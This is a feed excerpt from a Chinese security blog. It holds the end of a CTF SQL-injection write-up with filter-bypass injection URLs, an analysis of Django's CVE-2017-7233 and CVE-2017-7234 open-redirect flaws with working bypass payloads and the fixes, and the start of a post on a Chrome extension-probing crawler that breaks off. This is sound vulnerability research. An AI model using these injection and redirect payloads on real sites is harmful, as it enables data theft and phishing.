<p><a href="https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735" target="_blank" rel="external">https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;更新两篇之前在其他地方发过的文章&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;sqli&quot;&gt;sqli&lt;/h2&gt;&lt;p&gt;地址: &lt;a href=&quot;http://118.190.134.8/t1/news.php?id=1&quot;&gt;http://118.190.134.8/t1/news.php?id=1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;尝试sql注入，会发现过滤了’和空格等。使用&lt;br&gt;&lt;a href=&quot;http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1&quot;&gt;http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1&lt;/a&gt; 和 &lt;a href=&quot;http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2&quot;&gt;http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2&lt;/a&gt; 判断注入存在，开始思考出数据的方法&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5&quot;&gt;http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5&lt;/a&gt;&lt;br&gt;判断字段数为4&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4&quot;&gt;http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4&lt;/a&gt;&lt;br&gt;发现过滤了逗号&lt;/p&gt;
&lt;p&gt;那就不好用union出数据了，可选择使用盲注出数据比如&lt;code&gt;(select%a0ascii(substr((select%a0TABLE_NAME%a0from%a0information_schema.tables%a0where%a0TABLE_TYPE%a0=%a0&amp;quot;BASE%a0TABLE&amp;quot;%a0limit%a01%a0OFFSET%a02)%a0from%a01%a0for%a01))=1)%23&lt;/code&gt;。但是这里其实有一个union出数据的tip可以使用:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql $&amp;#62; select 1,2,3,4 Union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d&amp;#10;+-----+-----+-----+-----+&amp;#10;|   1 |   2 |   3 |   4 |&amp;#10;|-----+-----+-----+-----|&amp;#10;|   1 |   2 |   3 |   4 |&amp;#10;+-----+-----+-----+-----+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://blog.neargle.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Django的两则url跳转漏洞:CVE-2017-7233和CVE-2017-7234分析</title>
    <link href="http://blog.neargle.com/2017/04/12/Django-CVE-2017-7233-bypass-is-safe-url-and-CVE-2017-7233-serve-open-url/"/>
    <id>http://blog.neargle.com/2017/04/12/Django-CVE-2017-7233-bypass-is-safe-url-and-CVE-2017-7233-serve-open-url/</id>
    <published>2017-04-12T15:55:00.000Z</published>
    <updated>2017-06-22T08:36:15.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.djangoproject.com/weblog/2017/apr/04/security-releases/" target="_blank" rel="external">Django官方News&amp;Event</a>在4月4日发布了一个安全更新，修复了两个URL跳转的漏洞，一个是urlparse的锅，另一个来自国内的安全研究员 phithon@长亭,都非常漂亮。因为有复现Django漏洞的习惯，晚上抽了点时间复现了一下。有趣的点还挺多。把两个漏洞的分析整合在一起，凑了篇文章。（还是研究漏洞有趣啊，泪流满面QAQ）</p>
<h2 id="CVE-2017-7233分析">CVE-2017-7233分析</h2><p>国外安全研究员roks0n提供给Django官方的一个漏洞。</p>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fekb8wapitj317d0pxage.jpg" alt=""></p>
<a id="more"></a>
<h3 id="关于is_safe_url函数">关于is_safe_url函数</h3><p>Django自带一个函数：<code>django.utils.http.is_safe_url(url, host=None, allowed_hosts=None, require_https=False)</code>，用于过滤需要进行跳转的url。如果url安全则返回ture，不安全则返回false。文档如下:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print(is_safe_url.__doc__)</span><br><span class="line"></span><br><span class="line">Return ``True`` if the url is a safe redirection (i.e. it doesn't point to</span><br><span class="line">a different host and uses a safe scheme).</span><br><span class="line"></span><br><span class="line">Always returns ``False`` on an empty url.</span><br><span class="line"></span><br><span class="line">If ``require_https`` is ``True``, only 'https' will be considered a valid</span><br><span class="line">scheme, as opposed to 'http' and 'https' with the default, ``False``.</span><br></pre></td></tr></table></figure>
<p>让我们来看看常规的几个用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.http <span class="keyword">import</span> is_safe_url</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: is_safe_url(<span class="string">'http://baidu.com'</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: is_safe_url(<span class="string">'baidu.com'</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: is_safe_url(<span class="string">'aaaaa'</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: is_safe_url(<span class="string">'//blog.neargle.com'</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: is_safe_url(<span class="string">'http://google.com/adadadadad'</span>,<span class="string">'blog.neargle.com'</span>)</span><br><span class="line">Out[<span class="number">7</span>]: <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: is_safe_url(<span class="string">'http://blog.neargle.com/aaaa/bbb'</span>, <span class="string">'blog.neargle.com'</span>)</span><br><span class="line">Out[<span class="number">13</span>]: <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<p>可见在没有指定第二个参数host的情况下,url如果非相对路径，即<code>HttpResponseRedirect</code>函数会跳往别的站点的情况，<code>is_safe_url</code>就判断其为不安全的url,如果指定了host为<code>blog.neargle.com</code>，则<code>is_safe_url</code>会判断url是否属于’blog.neargle.com’，如果url是’blog.neargle.com’或相对路径的url，则判断其url是安全的。</p>
<h3 id="urllib-parse-urlparse的特殊情况">urllib.parse.urlparse的特殊情况</h3><p>问题就出在该函数对域名和方法的判断，是基于<code>urllib.parse.urlparse</code>的,源码如下(django/utils/http.py):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_is_safe_url</span><span class="params">(url, host)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> url.startswith(<span class="string">'///'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    url_info = urlparse(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url_info.netloc <span class="keyword">and</span> url_info.scheme:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> unicodedata.category(url[<span class="number">0</span>])[<span class="number">0</span>] == <span class="string">'C'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">not</span> url_info.netloc <span class="keyword">or</span> url_info.netloc == host) <span class="keyword">and</span></span><br><span class="line">            (<span class="keyword">not</span> url_info.scheme <span class="keyword">or</span> url_info.scheme <span class="keyword">in</span> [<span class="string">'http'</span>, <span class="string">'https'</span>]))</span><br></pre></td></tr></table></figure>
<p>我们来看一下urlparse的常规用法及几种urlparse无法处理的特殊情况。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://blog.neargle.com/2017/01/09/chrome-ext-spider-for-probe/'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'blog.neargle.com'</span>, path=<span class="string">'/2017/01/09/chrome-ext-spider-for-probe/'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'ftp:99999999'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">''</span>, netloc=<span class="string">''</span>, path=<span class="string">'ftp:99999999'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'http:99999999'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">''</span>, path=<span class="string">'99999999'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'https:99999999'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">''</span>, netloc=<span class="string">''</span>, path=<span class="string">'https:99999999'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'javascript:222222'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">''</span>, netloc=<span class="string">''</span>, path=<span class="string">'javascript:222222'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'ftp:aaaaaaa'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'ftp'</span>, netloc=<span class="string">''</span>, path=<span class="string">'aaaaaaa'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'ftp:127.0.0.1'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'ftp'</span>, netloc=<span class="string">''</span>, path=<span class="string">'127.0.0.1'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>urlparse(<span class="string">'ftp:127.0.0.1'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'ftp'</span>, netloc=<span class="string">''</span>, path=<span class="string">'127.0.0.1'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现当scheme不等于http，且path为纯数字的时候,urlparse处理例如<code>aaaa:2222222223</code>的情况是不能正常分割开的，会全部归为path。这时<code>url_info.netloc == url_info.scheme == &quot;&quot;</code>,则<code>((not url_info.netloc or url_info.netloc == host) and (not url_info.scheme or url_info.scheme in [&#39;http&#39;, &#39;https&#39;]))</code>为true。（这里顺便提一下,<a href="https://www.djangoproject.com/weblog/2017/apr/04/security-releases/" target="_blank" rel="external">django官方News&amp;Event</a>中提到的poc:”http:99999999”是无法bypass的，在前面的判断<code>if not url_info.netloc and url_info.scheme:</code>都过不了。）例如下面几种情况：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="prompt">&gt;&gt;&gt; </span>is_safe_url(<span class="string">'http:555555555'</span>)</span><br><span class="line"><span class="keyword">False</span></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>is_safe_url(<span class="string">'ftp:23333333333'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>is_safe_url(<span class="string">'https:2333333333'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<h3 id="使用IP_Decimal_Bypass_is_safe_url">使用IP Decimal Bypass is_safe_url</h3><p>但是既然是url跳转漏洞，我们就需要让其跳转到指定的url里，<code>https:2333333333</code>这样的url明显是无法访问的，而冒号之后必须纯数字,<code>http:127.0.0.1</code>是无法pypass的。有什么方法呢？其实ip不仅只有常见的点分十进制表示法,纯十进制数字也可以表示一个ip地址,浏览器也同样支持。例如: <code>127.0.0.1 == 2130706433</code>, <code>8.8.8.8 == 134744072</code>(转换器:<a href="http://www.ipaddressguide.com/ip),而&#39;http:2130706433&#39;是在浏览器上是可以访问到对应的ip及服务的，即&#39;http:2130706433" target="_blank" rel="external">http://www.ipaddressguide.com/ip),而&#39;http:2130706433&#39;是在浏览器上是可以访问到对应的ip及服务的，即&#39;http:2130706433</a> = <a href="http://127.0.0.1/&#39;。" target="_blank" rel="external">http://127.0.0.1/&#39;。</a></p>
<p>这里我们选用<code>https:1029415385</code>作为poc，这是一个google的ip,这个url可以bypass<code>is_safe_url</code>并跳转到google.com。</p>
<h3 id="漏洞验证与影响">漏洞验证与影响</h3><p>我们来写一个简单的环境:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.utils.http <span class="keyword">import</span> is_safe_url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BypassIsUrlSafeCheck</span><span class="params">(request)</span>:</span></span><br><span class="line">    url = request.GET.get(<span class="string">"url"</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> is_safe_url(url, host=<span class="string">"blog.neargle.com"</span>):</span><br><span class="line">        <span class="keyword">return</span> HttpResponseRedirect(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponseRedirect(<span class="string">'/'</span>)</span><br></pre></td></tr></table></figure></p>
<p>然后访问:<code>http://127.0.0.1:8000/bypassIsUrlSafeCheck?url=https:1029415385</code>, 如图,url被重定向到了google.com。<br><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fek9xcdj0mj317w0dfdmx.jpg" alt=""></p>
<p>并非只有开发者自己使用<code>is_safe_url</code>会受到影响，Django默认自带的admin也使用了这个函数来处理next GET | POST参数，当用户访问<code>/admin/login/?next=https:1029415385</code>进行登录时，登录后同样会跳转到google.com,退出登录时同样使用到了该函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_login_redirect_url</span><span class="params">(request, redirect_to)</span>:</span></span><br><span class="line">    <span class="comment">#### Ensure the user-originating redirection URL is safe.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_safe_url(url=redirect_to, host=request.get_host()):</span><br><span class="line">        <span class="keyword">return</span> resolve_url(settings.LOGIN_REDIRECT_URL)</span><br><span class="line">    <span class="keyword">return</span> redirect_to</span><br><span class="line"></span><br><span class="line"><span class="decorator">@never_cache</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(request, template_name=<span class="string">'registration/login.html'</span>,</span><br><span class="line">          redirect_field_name=REDIRECT_FIELD_NAME,</span><br><span class="line">          authentication_form=AuthenticationForm,</span><br><span class="line">          extra_context=None, redirect_authenticated_user=False)</span>:</span></span><br><span class="line">    ......</span><br><span class="line">            <span class="keyword">return</span> HttpResponseRedirect(_get_login_redirect_url(request, redirect_to))</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fekaefgrp6j31et0cl13b.jpg" alt=""></p>
<h3 id="修复">修复</h3><p>django修复了代码，自己重构了一下<code>urlparse</code>函数,修复了<code>urlparse</code>函数的这个漏洞。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_urlparse</span><span class="params">(url, scheme=<span class="string">''</span>, allow_fragments=True)</span>:</span></span><br><span class="line">    <span class="string">"""Parse a URL into 6 components:</span><br><span class="line">    &lt;scheme&gt;://&lt;netloc&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;fragment&gt;</span><br><span class="line">    Return a 6-tuple: (scheme, netloc, path, params, query, fragment).</span><br><span class="line">    Note that we don't break the components up in smaller bits</span><br><span class="line">    (e.g. netloc is a single string) and we don't expand % escapes."""</span></span><br><span class="line">    url, scheme, _coerce_result = _coerce_args(url, scheme)</span><br><span class="line">    splitresult = _urlsplit(url, scheme, allow_fragments)</span><br><span class="line">    scheme, netloc, url, query, fragment = splitresult</span><br><span class="line">    <span class="keyword">if</span> scheme <span class="keyword">in</span> uses_params <span class="keyword">and</span> <span class="string">';'</span> <span class="keyword">in</span> url:</span><br><span class="line">        url, params = _splitparams(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        params = <span class="string">''</span></span><br><span class="line">    result = ParseResult(scheme, netloc, url, params, query, fragment)</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(result)</span><br></pre></td></tr></table></figure>
<h3 id="关于官方提到的_possible_XSS_attack">关于官方提到的 possible XSS attack</h3><p><a href="https://www.djangoproject.com/weblog/2017/apr/04/security-releases/" target="_blank" rel="external">django官方News&amp;Event</a>中提到的这个漏洞可能会产生XSS，我认为除非程序员把接受跳转的url插入的到<code>&lt;script type=&quot;text/javascript&quot; src=&quot;&quot;&gt;&lt;/script&gt;</code>等特殊情况之外，直接使用产生XSS的场景还是比较少的。如果你想到了其他的场景还请赐教，祝好。</p>
<h2 id="CVE-2017-7234_分析">CVE-2017-7234 分析</h2><h3 id="漏洞详情">漏洞详情</h3><p>来自 @Phithon 的一个漏洞。</p>
<p>问题出现在：<code>django.views.static.serve()</code>函数上。该函数可以用来指定web站点的静态文件目录。如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">    url(<span class="string">r'^staticp/(?P&lt;path&gt;.*)$'</span>, serve, &#123;<span class="string">'document_root'</span>: os.path.join(settings.BASE_DIR, <span class="string">'staticpath'</span>)&#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>这样django项目根目录下staticpath中的所有文件，就可以在staticp/目录中访问。e.g. <code>http://127.0.0.1:8000/staticp/test.css</code></p>
<p>这种方法是不被django官方推荐在生成环境使用的，对安全性和性能都有一定影响。</p>
<p>问题代码如下 (django/views/static.py)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">path = posixpath.normpath(unquote(path))</span><br><span class="line">path = path.lstrip(<span class="string">'/'</span>)</span><br><span class="line">newpath = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> part <span class="keyword">in</span> path.split(<span class="string">'/'</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> part:</span><br><span class="line">        <span class="comment">#### Strip empty path components.</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    drive, part = os.path.splitdrive(part)</span><br><span class="line">    head, part = os.path.split(part)</span><br><span class="line">    <span class="keyword">if</span> part <span class="keyword">in</span> (os.curdir, os.pardir):</span><br><span class="line">        <span class="comment">#### Strip '.' and '..' in path.</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    newpath = os.path.join(newpath, part).replace(<span class="string">'\\'</span>, <span class="string">'/'</span>)</span><br><span class="line"><span class="keyword">if</span> newpath <span class="keyword">and</span> path != newpath:</span><br><span class="line">    <span class="keyword">return</span> HttpResponseRedirect(newpath)</span><br></pre></td></tr></table></figure>
<p>path既我们传入的路径,如果传入的路径为<code>staticp/path.css</code>,则<code>path=path.css</code>。跟踪代码可知，path经过了unquote进行url解码，后来又<code>replace(&#39;\\&#39;, &#39;/&#39;)</code>,进入HttpResponseRedirect，很诡异的逻辑看起来很有问题。一般遇到这类型的函数我们会先试着找看看,任意文件读漏洞，但是这个对<code>&#39;.&#39;</code>和<code>&#39;..&#39;</code>进行了过滤，所以这边这个HttpResponseRedirect函数就成了帅的人的目标。</p>
<p>我们的最终目的是<code>HttpResponseRedirect(&#39;//evil.neargle.com&#39;)</code>或者<code>HttpResponseRedirect(&#39;http://evil.neargle.com&#39;)</code>,那么就要使<code>path != newpath</code>，那么path里面就必须带有’\‘，好的现在的我们传入<code>&#39;/staticp/%5C%5Cblog.neargle.com&#39;</code>,则<code>path=&#39;\\\\blog.neargle.com&#39;;newpath=&#39;//blog.neargle.com&#39;</code>,HttpResponseRedirect就会跳转到<code>&#39;blog.neargle.com&#39;</code>造成跳转漏洞。</p>
<h3 id="修复-1">修复</h3><p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fekcmmfjskj31e60l1q87.jpg" alt=""></p>
<p>嗯，官方表示自己也不知道为什么要写这串代码，删了这一串代码然后用safe_url函数代替。</p>
<h3 id="ps-">ps.</h3><p>浏览器不仅仅支持十进制来代替点分十进制的IP，也可以使用十六进制和8进制来代替。<code>http://点分十进制 == http://十进制 == http://0x十六进制 == http://0八进制</code>(例如:<code>http://127.0.0.1 == http://2130706433 == http://0x7F000001 == http://017700000001</code>),十六进制非纯数字所以不可用来bypass urlparse，但是八进制还是可以的。</p>
<h3 id="urls">urls</h3><ul>
<li><a href="https://github.com/django/django/commit/5ea48a70afac5e5684b504f09286e7defdd1a81a" target="_blank" rel="external">https://github.com/django/django/commit/5ea48a70afac5e5684b504f09286e7defdd1a81a</a></li>
<li><a href="https://www.djangoproject.com/weblog/2017/apr/04/security-releases/" target="_blank" rel="external">https://www.djangoproject.com/weblog/2017/apr/04/security-releases/</a></li>
<li><a href="https://docs.python.org/3/library/urllib.parse.html" target="_blank" rel="external">https://docs.python.org/3/library/urllib.parse.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.djangoproject.com/weblog/2017/apr/04/security-releases/&quot;&gt;Django官方News&amp;amp;Event&lt;/a&gt;在4月4日发布了一个安全更新，修复了两个URL跳转的漏洞，一个是urlparse的锅，另一个来自国内的安全研究员 phithon@长亭,都非常漂亮。因为有复现Django漏洞的习惯，晚上抽了点时间复现了一下。有趣的点还挺多。把两个漏洞的分析整合在一起，凑了篇文章。（还是研究漏洞有趣啊，泪流满面QAQ）&lt;/p&gt;
&lt;h2 id=&quot;CVE-2017-7233分析&quot;&gt;CVE-2017-7233分析&lt;/h2&gt;&lt;p&gt;国外安全研究员roks0n提供给Django官方的一个漏洞。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/005y7Ba5gy1fekb8wapitj317d0pxage.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://blog.neargle.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Chrome Extensions Spider &amp; Downloader</title>
    <link href="http://blog.neargle.com/2017/01/09/chrome-ext-spider-for-probe/"/>
    <id>http://blog.neargle.com/2017/01/09/chrome-ext-spider-for-probe/</id>
    <published>2017-01-09T05:42:21.000Z</published>
    <updated>2017-01-23T02:40:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>可以先看一下n0r00t的文章的这一篇:<a href="https://www.n0tr00t.com/2017/01/09/Chrome-Extensions-Probe.html" target="_blank" rel="external">https://www.n0tr00t.com/2017/01/09/Chrome-Extensions-Probe.html</a>。<br>以及用chrome试用一下最后的成果POC:<a href="http://server.n0tr00t.com/chrome/ext_probe.html" target="_blank" rel="external">http://server.n0tr00t.com/chrome/ext_probe.html</a>，可以探测Chrome中已安装的扩展，配合Chrome扩展的一些漏洞，说不定能达到定点攻击的效果。<br><a id="more"></a><br>和蘑菇同学一起弄的一个有趣的尝试。在此之上写的爬虫项目，主要以实现目的为主，不过有几个点挺有意思，稍微记录分享一下，留给后人用。主要的思路可以看上面的文章，简单来说就是：以script标签on事件的差异性，结合Chrome开发规范”version 2.0”的manifest.json中的<code>web_accessible_resources</code>，探测客户端所存在的扩展。</p>
<p>我这里主要负责的工作就是前期的数据准备啦。主要目的：爬虫获取Chrome扩展的一些信息包括：扩展ID，扩展名，Star数量，用户数量、类别、插件商店URL等信息，然后根据ID下载扩展的.crx文件进行解压，提取其manifest.json，解析manifest.json中的<code>web_accessible_resources</code>字段，生成一个json文件。</p>
<p>github地址：<a href="https://github.com/neargle/ChromeExtensionKnower" target="_blank" rel="external">https://github.com/neargle/ChromeExtensionKnower</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 geknower.py --help                                                                             master [b563839] modified untracked</span><br><span class="line">[*] main start</span><br><span class="line">Usage: geknower.py [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --help  Show this message <span class="keyword">and</span> exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  etxDownload        Download Chrome Etx .crx file <span class="keyword">and</span> get some...</span><br><span class="line">  etxInfo            Crawl <span class="keyword">and</span> update Chrome Etx infomation</span><br><span class="line">  spec-fileCheck     Check filename <span class="keyword">in</span> web_accessible_resources <span class="keyword">is</span>...</span><br><span class="line">  spec-weblistAgain  Re get weblist</span><br></pre></td></tr></table></figure>
<p>关于脚本如何使用，可以去看一下github上面的readme，这里主要先记录一下写程序时遇到的一些有趣的点，以备后人使用。看完这些可能更有助于你理解代码。</p>
<h2 id="Q-_Note">Q. Note</h2><h3 id="1-_Chrome_WebStore_Api">1. Chrome WebStore Api</h3><p>主要用到三个API: </p>
<ol>
